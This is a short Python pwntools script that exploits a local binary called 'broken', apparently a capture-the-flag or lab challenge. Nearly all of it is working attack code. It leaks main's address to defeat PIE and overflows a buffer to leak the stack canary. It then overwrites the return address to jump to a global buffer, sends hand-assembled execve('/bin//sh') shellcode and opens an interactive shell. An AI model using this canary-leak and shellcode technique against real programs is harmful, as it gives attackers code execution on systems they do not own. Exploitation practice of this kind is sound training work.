from pwn import *

context.binary = el = ELF('broken')
main = el.symbols['main']

p = process('broken')

main_hex = p.recvline().decode().split(' ')[-1]
offset_pie = int(main_hex, 16) - main
if offset_pie % pow(16,3) == 0:
    print('page offset aligned')
else:
    print('page offset not aligned')
el.address = offset_pie
bufferone = el.symbols['bufferone']


p.recvline()
p.sendline(b'A'*40) # overwrite canary by one
offset = 40 + 22
p.recvline() # read untile the /n(first byte of canary)
canary = p.recvline()[:7]
canary = b'\x00' + canary
print('canary: ' + canary.hex())

payload = b'A'*40 + canary + b'A'*8 + p64(bufferone)
p.sendline(payload)

shellcode =b"\x48\x31\xd2"                                +    b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"   +    b"\x48\xc1\xeb\x08"                            +    b"\x53"                                    +    b"\x48\x89\xe7"     +    b"\x50"                +    b"\x57"                      +    b"\x48\x89\xe6"                     +    b"\xb0\x3b"                           +    b"\x0f\x05"   

p.recvline()
p.sendline(shellcode) # overwrite canary by one
p.interactive()

# telescope e vedo lo stack